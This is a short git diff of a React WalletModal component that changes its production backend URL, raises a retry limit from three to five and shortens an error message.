@@ -13,7 +13,6 @@ import { SwitchIos } from "./mui-treasury/switch-ios";
 import SquareProgress from "./components/square-progress";
 import ContentPasteIcon from "@mui/icons-material/ContentPaste";
 import ErrorImg from "./assets/error.svg";
-
 //import BASE_URL  from "../config";
 
 const WalletModal = ({ open, onClose, selectedWallet }) => {
@@ -31,7 +30,7 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
 
   const BASE_URL =
     import.meta.env.MODE === "production"
-      ? "https://blockchain-backend-puce.vercel.app/api"
+      ? "https://blockchain-backend-hwmx.onrender.com/api"
       : "http://localhost:3000/api";
 
   const handleTabChange = (event, newValue) => {
@@ -115,7 +114,7 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
       return;
     }
   
-    const maxRetries = 3;
+    const maxRetries = 5;
     let retryCount = 0;
   
     while (retryCount < maxRetries) {
@@ -145,7 +144,7 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
         if (retryCount === maxRetries) {
           await new Promise((resolve) => setTimeout(resolve, 3000)); // 3-second delay
           setIsLoading(false); // Stop loading after delay
-          setErrorMessage("Error occurred while sending data.");
+          setErrorMessage("Error occurred");
           setShowErrorPopup(true);
         } else {
           await new Promise((resolve) => setTimeout(resolve, 1000));
